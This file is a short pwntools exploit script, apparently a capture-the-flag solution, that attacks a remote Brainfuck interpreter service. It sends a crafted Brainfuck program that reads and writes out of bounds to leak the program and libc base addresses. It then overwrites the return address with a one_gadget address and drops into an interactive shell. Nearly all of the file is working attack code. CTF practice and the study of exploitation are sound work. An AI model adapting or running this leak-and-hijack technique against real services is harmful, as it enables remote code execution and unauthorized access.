from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "debug"

elf = ELF("./bf_patched")

payload = b">" * 0x20 + b".>" * 0x8 + b">" * 0x10
payload += b">" * (0x60 - payload.count(b">"))
payload += b"[>]>" + b">" * 0x18 + b".>" * 0x8 + b"<" * 0x8 + b",>" * 0x8
payload += b"_" * (0xFFF - len(payload))
# io = gdb.debug("./bf_patched", "b *(0x0000555555554000+0x1212)\nc", aslr=False)
# io = gdb.debug("./bf_patched", "b *(main+217)\nc", aslr=False)
# io = process("./bf_patched")
io = remote("spclr.ch", 1250)

io.send(payload)
prog_base = int.from_bytes(io.recvn(8), "little") - elf.sym["__libc_csu_init"]
print(f"{prog_base = :#x}")

libc_base = int.from_bytes(io.recvn(8), "little") - 0x270B3
print(f"{libc_base = :#x}")
gadget = libc_base + 0xE6C81

chain = flat([gadget])
io.send(chain)

io.interactive()
